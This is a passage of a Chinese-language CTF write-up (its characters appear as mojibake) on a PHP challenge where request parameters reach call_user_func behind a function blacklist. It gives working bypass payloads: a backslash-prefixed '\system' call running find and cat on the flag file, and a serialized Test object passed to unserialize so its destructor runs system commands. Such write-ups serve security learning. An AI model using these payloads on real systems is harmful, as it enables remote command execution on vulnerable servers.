class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>); <span class="hljs-comment">//è°ƒç”¨call_user_funcå‡½æ•°ï¼Œæ³¨æ„è¯¥å‡½æ•°åªèƒ½è°ƒç”¨å¯ä»¥å›è°ƒçš„å‡½æ•°</span><br>       <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>); <span class="hljs-comment">//$resultæ˜¯ä»€ä¹ˆç±»å‹ï¼Ÿ</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123; <span class="hljs-comment">//å¦‚æœæ˜¯å­—ç¬¦ä¸²</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125; <span class="hljs-comment">//å¦‚æœæ˜¯å…¶å®ƒ</span><br>   &#125;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="hljs-comment">//æ—§å¼çš„ç”¨äºå£°æ˜ç±»å±æ€§ï¼ˆæˆå‘˜å˜é‡ï¼‰çš„å…³é”®å­—ï¼Œæ–°ç‰ˆæœ¬çš„PHPå¤šç”¨ publicç­‰</span><br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<span class="hljs-comment">//è·å–é€šè¿‡ GETã€POST å’Œ COOKIE æ–¹æ³•ä¼ é€’çš„å‚æ•°</span><br>   <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>       <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>       &#125;<br>   &#125;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å°è¯•ç”¨ç›¸å¯¹è·¯å¾„è¯»æœ‰æ²¡æœ‰flag.phpè¿™ä¸œè¥¿ã€‚ã€‚æ²¡è¯•å‡ºæ¥ã€‚ã€‚å°±å»ç½‘ä¸Šæ‰¾äº†ä¸‹wpã€‚æ„Ÿè§‰å·²ç»å¾ˆæ¥è¿‘ç»“æœäº†æœ‰ç‚¹ä¸ç”˜å¿ƒğŸ˜”æ„Ÿè°¢è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<br><code>https://blog.csdn.net/qq_58784379/article/details/120877859</code><br>ç¬¬ä¸€ç§æ–¹æ³•ï¼š<br>åœ¨PHPä¸­çš„å‡½æ•°å‰é¢åŠ ä¸ª\å¹¶ä¸å°è±¡å‡½æ•°è¿è¡Œ(phpå†…çš„â€ \ â€œåœ¨åšä»£ç æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šè¯†åˆ«ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œç»•è¿‡é»‘åå•)ã€‚æ‹¿å‰é¢é‚£ä¸ªis_callableå‡½æ•°ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (\<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¯ä»¥å›è°ƒ&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ä¸å¯å›è°ƒ&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//ç»“æœä»æ˜¯ä¸å¯å›è°ƒ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é—®äº†ä¸‹GPTï¼Œè¿™ä¸ª\æ˜¯ä¸€ç§å‘½åç©ºé—´é™å®šç¬¦ï¼Œç”¨äºå‘Šè¯‰ PHP è§£é‡Šå™¨è¦ä½¿ç”¨å…¨å±€å‘½åç©ºé—´ä¸­çš„å‡½æ•°ï¼Œè€Œä¸æ˜¯å½“å‰å‘½åç©ºé—´ä¸­çš„å‡½æ•°ã€‚å¦‚æœæ²¡æœ‰ä½¿ç”¨å‘½åç©ºé—´æˆ–æ²¡æœ‰åŒåå‡½æ•°å­˜åœ¨äºå…¨å±€å‘½åç©ºé—´ä¸­ï¼Œæ·»åŠ åæ–œæ å°†æ²¡æœ‰å®é™…å½±å“ã€‚<br><code>func=\system&amp;p=find / -name &quot;flag*&quot;//è·Ÿä»¥å‰åšçš„é¢˜ä¸€æ ·ï¼Œåªè¦ç”¨findæ‰¾ä¸œè¥¿å°±æ˜¯å…¨ç£ç›˜æŸ¥æ‰¾ï¼Œä¼šå¾ˆæ…¢</code><br>å›æ˜¾ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png" alt="image"><br>è¯»æœ€åº•ä¸‹è¿™ä¸ª<code>/tmp/flagoefiu4r93</code>ï¼š<br><code>func=file_get_contents&amp;p=/tmp/flagoefiu4r93</code><br>æˆ–è€…<code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code><br>å¾—flag<br>ç¬¬äºŒç§æ–¹æ³•ç”¨äº†ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p); <span class="hljs-comment">//å‘½ä»¤æ‰§è¡Œ</span><br>            &#125;<br>        &#125;<br><span class="hljs-comment">//è¿™ä¸œè¥¿æ²¡è¢«ç”¨è¿‡ï¼Œå› ä¸ºTestç±»é‡ŒåŒ…å«ä¸€ä¸ª__destructå‡½æ•°ï¼Œè¿™å‡½æ•°åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è°ƒç”¨ï¼Œ</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æƒ³æ‰§è¡Œsystem(â€˜lsâ€™)è€Œä¸”è¦ç»•è¿‡å¯¹funcçš„é»‘åå•æ£€æµ‹ï¼Œå¯ä»¥å…ˆåºåˆ—åŒ–è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶ååˆ©ç”¨getå‡½æ•°ååºåˆ—åŒ–è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œååºåˆ—åŒ–åè¦é”€æ¯å˜é‡æ—¶ä¼šè°ƒç”¨__destructå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å®šä¹‰äº†func(è¦æ‰§è¡Œçš„å‘½ä»¤)å’Œp(è¦æ‰§è¡Œå‘½ä»¤çš„å‚æ•°)ï¼Œç„¶åå†è°ƒç”¨ä¸€æ¬¡gettimeå‡½æ•°(åˆæ‰§è¡Œäº†ä¸€æ¬¡å‘½ä»¤)ã€‚ä¸€æ¥ä¸€å›æ‰§è¡Œäº†ä¸¤æ¬¡gettimeã€‚<br>å…ˆåºåˆ—åŒ–æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤å’Œå‚æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>       <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//ç»“æœï¼šO:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>payload:<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;// çœ‹å½“å‰ç›®å½•ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png" alt="image"><br>OKï¼Œæ²¡å•¥é—®é¢˜ï¼Œå› ä¸ºæ ¹æ®ç¬¬ä¸€ç§åšæ³•å·²ç»çŸ¥é“äº†flagè—åœ¨å“ªï¼Œç›´æ¥å»æ‰¾<code>/tmp/flagoefiu4r93</code>æŠŠæˆ‘ä»¬çš„å‘½ä»¤åºåˆ—åŒ–ä¸€ä¸‹ï¼š<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code><br>ç»“æœï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
